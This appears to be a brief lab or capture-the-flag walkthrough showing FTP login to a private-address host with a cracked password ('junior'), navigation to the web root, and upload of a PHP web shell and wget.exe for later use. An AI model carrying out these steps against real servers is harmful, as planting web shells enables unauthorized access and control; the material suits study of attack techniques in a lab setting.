now will be crack ftp user admin-it password junior with hydra:

$`ftp 192.168.244.132`

`admin-it`

`junior`

>`pwd`
now you are in the home dirictory of the admin-it

let to go to web service directory 

>`cd /var/www`

>`ls`

will see the admin-it folder with the permsion 

now will be enter to this folder 

>`cd admin-it`

>`ls`

now the folder is empty



this folder can be open by the web server in browser:



so you can upload to this folder a file

in my attacker ip in the /home/feras there is   files  wget.exe and simple-webshell.php it will be upload to the /var/www/admin-it
 
 use command put upload file:

>`put simple-webshell.php`

if you want to upload or download files ascii in ftp you must type the binary or ascii before put or get command

>`binary`

>`put wget.exe`






